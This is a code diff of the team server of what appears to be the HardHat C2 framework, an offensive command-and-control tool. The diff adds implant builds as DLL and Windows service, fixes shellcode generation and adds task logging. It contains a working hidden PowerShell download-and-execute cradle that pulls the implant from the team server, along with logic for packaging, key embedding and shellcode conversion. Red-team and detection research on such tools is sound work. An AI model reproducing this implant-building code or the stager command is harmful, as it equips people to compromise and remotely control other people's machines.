@@ -120,10 +120,11 @@ namespace TeamServer.Controllers
                 {
                     Engineer.previousTasks.Add(engineerId, new List<EngineerTask>() { taskHeader });
                 }
+                EngineerTask LoggingTask = new EngineerTask() { Id = task.Id, Command = task.Command, Arguments = task.Arguments, File = null, IsBlocking = task.IsBlocking };
 
                 HardHatHub.UpdateOutgoingTaskDic(engineerId, taskHeader.Id, taskHeader.Command);
                 HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"task {task.Command} {args} queued for execution", Status = "info" });
-                LoggingService.TaskLogger.Information("task {@taskHeader} queued for execution", taskHeader);
+                LoggingService.TaskLogger.ForContext("Task", LoggingTask, true).ForContext("Engineer_Id",engineerId).Information($"task {taskHeader.Command} queued for execution");
                 return Created(path, task);
 			}
             return NotFound();
@@ -242,59 +243,99 @@ namespace TeamServer.Controllers
             
 			//update the two univerisal strings as well 
 			file = file.Replace("{{REPLACE_MESSAGE_PATH_KEY}}", Encryption.UniversialMessagePathKey); // used on C2 messages 
-            file = file.Replace("{{REPLACE_METADATAID_KEY}}", Encryption.UniversialMetadataIdKey); // used on the metadata id header which is used to verify the implant is talking to the correct teamserver
+            file = file.Replace("{{REPLACE_METADATA_KEY}}", Encryption.UniversialMetadataKey); // used on the metadata id header which is used to verify the implant is talking to the correct teamserver
+
+            file = file.Replace("{{REPLACE_UNIQUE_TASK_KEY}}", Encryption.UniversalTaskEncryptionKey);
 
 			//string sleepFuncFile = System.IO.File.ReadAllText(pathSplit[0] + $"..{allPlatformPathSeperator}Engineer"+$"{allPlatformPathSeperator}"+"Functions"+$"{allPlatformPathSeperator}"+"Sleepydll.cs");
             file = file.Replace("{{REPLACE_SLEEP_DLL}}", Convert.ToBase64String(System.IO.File.ReadAllBytes(pathSplit[0] + "Programs" + $"{allPlatformPathSeperator}" + "Extensions" + $"{allPlatformPathSeperator}" + "run3.dll")));
 
             //generate code for the implant
-            byte[] assemblyBytes = Utilities.Compile.GenerateCode(file);
+            byte[] assemblyBytes = Utilities.Compile.GenerateCode(file, request.complieType);
             if (assemblyBytes is null)
 			{
 				return BadRequest("Failed to compile Engineer, check teamServer Console for errors.");
 			}
-			try
-			{
-                //use ilMerge to merge the assembly and the protobuf dlls
-                GC.Collect();
-				GC.WaitForPendingFinalizers();
 
-                //if pathSplit[0]+temp does not exist then create it
-                if (!Directory.Exists(pathSplit[0] + "temp"))
-                {
-                    Directory.CreateDirectory(pathSplit[0] + "temp");
-                }
+            try
+            {
+	            //use ilMerge to merge the assembly and the protobuf dlls
+	            GC.Collect();
+	            GC.WaitForPendingFinalizers();
 
-                System.IO.File.WriteAllBytes(pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe", assemblyBytes);
-                
-                var outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
-                var sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
-                var netserlLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}NetSerializer.dll";
-                var netstnlLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}netstandard.dll";
-                var searchDir = $"{pathSplit[0]}Data{allPlatformPathSeperator}";
+	            //if pathSplit[0]+temp does not exist then create it
+	            if (!Directory.Exists(pathSplit[0] + "temp"))
+	            {
+		            Directory.CreateDirectory(pathSplit[0] + "temp");
+	            }
 
-                string[] assemblyArray = { sourceAssemblyLocation, netserlLocation, netstnlLocation};
-                Utilities.MergeAssembly.MergeAssemblies(outputLocation, assemblyArray, searchDir);
+
+
+	            string outputLocation = "";
+	            string sourceAssemblyLocation = "";
+	            if (request.complieType == SpawnEngineerRequest.EngCompileType.exe)
+	            {
+		            outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
+		            sourceAssemblyLocation =
+			            pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
+		            System.IO.File.WriteAllBytes(
+			            pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe", assemblyBytes);
+	            }
+	            else if (request.complieType == SpawnEngineerRequest.EngCompileType.dll)
+	            {
+		            outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll";
+		            sourceAssemblyLocation =
+			            pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.dll";
+		            System.IO.File.WriteAllBytes(
+			            pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.dll", assemblyBytes);
+	            }
+	            else if (request.complieType == SpawnEngineerRequest.EngCompileType.serviceexe)
+	            {
+		            outputLocation = pathSplit[0] + ".." +
+		                             $"{allPlatformPathSeperator}Engineer_{managerName}_service.exe";
+		            sourceAssemblyLocation = pathSplit[0] + "temp" +
+		                                     $"{allPlatformPathSeperator}Engineer_{managerName}_service.exe";
+		            System.IO.File.WriteAllBytes(
+			            pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}_service.exe",
+			            assemblyBytes);
+	            }
+	            else
+	            {
+		            outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
+		            sourceAssemblyLocation =
+			            pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
+		            System.IO.File.WriteAllBytes(
+			            pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe", assemblyBytes);
+	            }
+
+
+	            var netserlLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}NetSerializer.dll";
+	            var netstnlLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}netstandard.dll";
+	            var searchDir = $"{pathSplit[0]}Data{allPlatformPathSeperator}";
+
+	            string[] assemblyArray = { sourceAssemblyLocation, netserlLocation, netstnlLocation };
+	            Utilities.MergeAssembly.MergeAssemblies(outputLocation, assemblyArray, searchDir);
+
+
+	            Console.WriteLine("Merged Engineer and needed dlls");
+	            var updatedExe = System.IO.File.ReadAllBytes(outputLocation);
+	            //if file exists for delete it so write all bytes can work
+	            GC.Collect();
+	            GC.WaitForPendingFinalizers();
+	            //make a copy of the engineer in the temp folder to use for some commands later
+	            System.IO.File.WriteAllBytes(sourceAssemblyLocation, updatedExe);
             }
-			catch (Exception ex)
-			{
-				Console.WriteLine(ex.Message);
-				Console.WriteLine(ex.StackTrace);
-                return BadRequest("Merging of exe and needed dlls failed, check teamServer Console for errors.");
+            catch (Exception ex)
+            {
+	            Console.WriteLine(ex.Message);
+	            Console.WriteLine(ex.StackTrace);
+	            return BadRequest("Merging of exe and needed dlls failed, check teamServer Console for errors.");
             }
-			
-            
+
             if (request.complieType == SpawnEngineerRequest.EngCompileType.exe)
 			{
 				try
 				{
-                    Console.WriteLine("Merged Engineer and needed dlls");
-                    //System.IO.File.WriteAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe", assemblyBytes);
-					var updatedExe = System.IO.File.ReadAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
-                    //if file exists for delete it so write all bytes can work
-                    GC.Collect();
-                    GC.WaitForPendingFinalizers();
-                    System.IO.File.WriteAllBytes(pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe", updatedExe); //make a copy of the engineer i nthe temp folder to use for some commands later
 					//if enviornment is windows then run confuse 
 					if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
 					{
@@ -313,27 +354,71 @@ namespace TeamServer.Controllers
                     return BadRequest("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe already exists.");
 				}
 			}
+            else if (request.complieType == SpawnEngineerRequest.EngCompileType.serviceexe)
+            {
+	            try
+	            {
+		            //if enviornment is windows then run confuse 
+		            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+		            {
+			            //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
+		            }
+		            string compiledEngLocation = $"{ pathSplit[0] }..{ allPlatformPathSeperator }Engineer_{ managerName }_Service.exe";
+		            HardHatHub.AlertEventHistory(new HistoryEvent { Event = $" Service engineer compiled saved at {compiledEngLocation}", Status = "success" });
+		            LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
+		            Thread.Sleep(10);
+		            return Ok("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_Service.exe");
+	            }
+	            catch (Exception ex)
+	            {
+		            Console.WriteLine(ex.Message);
+		            Console.WriteLine(ex.StackTrace);
+		            return BadRequest("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_Service.exe already exists.");
+	            }
+            }
+            else if (request.complieType == SpawnEngineerRequest.EngCompileType.dll)
+            {
+	            try
+	            {
+		            //if enviornment is windows then run confuse 
+		            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+		            {
+			            //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
+		            }
+		            string compiledEngLocation = $"{ pathSplit[0] }..{ allPlatformPathSeperator }Engineer_{ managerName }.dll";
+		            HardHatHub.AlertEventHistory(new HistoryEvent { Event = $" Service engineer compiled saved at {compiledEngLocation}", Status = "success" });
+		            LoggingService.EventLogger.Information("Compiled engineer saved at {compiledEngLocation}", compiledEngLocation);
+		            Thread.Sleep(10);
+		            return Ok("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll");
+	            }
+	            catch (Exception ex)
+	            {
+		            Console.WriteLine(ex.Message);
+		            Console.WriteLine(ex.StackTrace);
+		            return BadRequest("Compiled Engineer at " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll already exists.");
+	            }
+            }
 			else if (request.complieType == SpawnEngineerRequest.EngCompileType.shellcode)
 			{
 				try
 				{
-                    var updatedExe = System.IO.File.ReadAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe");
-                    System.IO.File.WriteAllBytes(pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe", updatedExe);
                     //call the shellcode utility giving it the path we just wrote this exe to then return the shellcode and write its content to a file 
-                    var shellcodeLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}_merged.exe";
+                    var shellcodeLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                     var shellcode = Utilities.Shellcode.AssemToShellcode(shellcodeLocation, "");
                     System.IO.File.WriteAllBytes(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin", shellcode);
 
                     //Utilities.Compile.RunConfuser(pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe");
-                    string shellLocation = "{pathSplit[0]}..{allPlatformPathSeperator }Engineer_{managerName }_shellcode.bin";
+                    string shellLocation = $"{pathSplit[0]}..{allPlatformPathSeperator }Engineer_{managerName}_shellcode.bin";
                     HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"Engineer shellcode written to {shellLocation}", Status = "success" });
                     LoggingService.EventLogger.Information("Engineer shellcode written to {shellLocation}", shellLocation);
 
                     return Ok("Shellcode file written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin");
 				}
-				catch (Exception)
+				catch (Exception ex)
 				{
-					return BadRequest("Engineer shellcode " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.bin already exists.");
+                    Console.WriteLine(ex.Message);
+                    Console.WriteLine(ex.StackTrace);
+                    return BadRequest("Engineer shellcode " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.bin already exists.");
 				}
 			}
             //if request.compileType is powershellcmd then convert the assemnbly bytes to a base64 string 
@@ -354,8 +439,10 @@ namespace TeamServer.Controllers
                     HardHatHub.AddPsCommand($"powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('https://TeamserverIp:HttpManagerPort/Engineer_{managerName}_pscmd.txt'))\"");
                     return Ok("Powershell command written to " + pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_pscmd.txt");
                 }
-                catch (Exception)
+                catch (Exception ex )
                 {
+                    Console.WriteLine(ex.Message);
+                    Console.WriteLine(ex.StackTrace);
                     return BadRequest("powershell cmd generation failed");
                 }
             }
